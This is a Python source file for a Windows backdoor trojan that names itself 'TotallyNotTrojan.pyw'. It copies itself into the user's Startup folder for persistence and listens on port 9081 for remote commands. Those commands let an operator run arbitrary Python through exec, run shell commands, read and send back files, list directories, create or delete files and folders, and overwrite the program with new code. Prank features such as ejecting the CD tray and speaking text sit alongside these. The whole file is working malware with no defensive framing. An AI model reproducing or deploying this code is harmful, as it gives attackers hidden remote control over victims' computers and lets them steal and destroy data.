import socket, os, time, ctypes
from random import randint;VERSION = "BUILD 1424.NOUPD (Reading files via cat)"
sock = socket.socket();sock.bind(("", 9081));sock.listen(10)
import sys, getpass
boot = "C:/Users/"+getpass.getuser()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TotallyNotTrojan.pyw"
if sys.argv[0] != boot:
    import shutil
    shutil.copyfile(sys.argv[0], boot)
def uptodate():
    data = conn.recv(1000000).decode("utf-8")
    with open("TotallyNotTrojan.pyw", "w") as f:
        f.write(data)
        f.close()
def selftest():conn.send(VERSION.encode("utf-8"))
def execpy():exec(pycomm)
def talk():
    try:
        talkfile = open("1.vbs", "w")
        talkfile.write("set sapi=CreateObject(\"sapi.spvoice\") \n sapi.speak \""+texttotalk+"\"")
        talkfile.close()
        os.system("start 1.vbs");time.sleep(1);os.system("del 1.vbs")
    except:pass
def mess():ctypes.windll.user32.MessageBoxW(0, message, title, 0)
def nice():
    try:
        d = randint(1, 4)
        if d == 1:os.system("C:/Windows/System32/Ribbons.scr -s")
        if d == 2:os.system("C:/Windows/System32/Bubbles.scr -s")
        if d == 3:os.system("C:/Windows/System32/Mystify.scr -s")
        if d == 4:os.system("C:/Windows/System32/ssText3d.scr -s")
    except:pass
def directory():
    try:os.mkdir(foldertocreatedec)
    except:pass
def cdjoke():
    try:
        talkfile = open("1.vbs", "w")
        talkfile.write("Set objWMP = CreateObject(\"WMPlayer.OCX.7\")\nSet colCDs = objWMP.cdromCollection\ncolCDs.Item(0).Eject\nMsgBox \"Press any key to close CD\",64,\"Open Close Cd Tray\"\ncolCDs.Item(0).Eject")
        talkfile.close()
        os.system("start 1.vbs");time.sleep(1);os.system("del 1.vbs")
    except:pass
def fun():os.popen("explorer https://youtube.com")
def files():
    try:
        files = open(aboutfile, "w")
        files.write(filedatadec)
        files.close()
    except:pass
def prompt(arg):os.popen(arg)
def removefld():
    try:os.rmdir(foldtoremdec)
    except FileNotFoundError:pass
def remove():
    try:os.remove(filetoremdec)
    except FileNotFoundError:pass
def ls():
    try:
        path = conn.recv(10005).decode("utf-8")
        if path != None and path != "":
            flsf = os.listdir(path)
            fls = str(flsf.encode("utf-8"))
            conn.send(fls)
    except FileNotFoundError: pass
def cat(fl):
    with open(fl, "rb") as f:
        conn.send(f.read())
        f.close()
while True:
    conn, addr = sock.accept()
    data = conn.recv(16384)
    udata = data.decode("utf-8")
    if udata == "update":uptodate()
    if udata == "execpy":
        pycommf = conn.recv(16384)
        pycomm = pycommf.decode("utf-8")
        execpy()
    if udata == "fun":fun()
    if udata == "nice":nice()
    if udata == "mkdir":
        foldertocreate = conn.recv(16384)
        foldertocreatedec = foldertocreate.decode("utf-8")
        directory()
    if udata == "file":
        aboutfile = conn.recv(16384)
        filedata = conn.recv(16384)
        filedatadec = filedata.decode("utf-8")
        files()
    if udata == "rmdir":
        foldtorem = conn.recv(16384)
        foldtoremdec = foldtorem.decode("utf-8")
        removefld()
    if udata == "rm":
        filetorem = conn.recv(16384)
        filetoremdec = filetorem.decode("utf-8")
        remove()
    if udata == "message":
        messagef = conn.recv(1600)
        titlef = conn.recv(1600)
        message = messagef.decode("utf-8")
        title = titlef.decode("utf-8")
        mess()
    if udata == "talk":
        texttotalkf = conn.recv(1600)
        texttotalk = texttotalkf.decode("utf-8")
        talk()
    if udata == "ls":ls()
    if udata == "selftest":selftest()
    if udata == "shell":prompt(conn.recv(16384).decode("utf-8"))
    if udata == "cdjoke":cdjoke()
    if udata == "cat":
        cat(conn.recv(16384).decode("utf-8"))
    else:pass;conn.close()
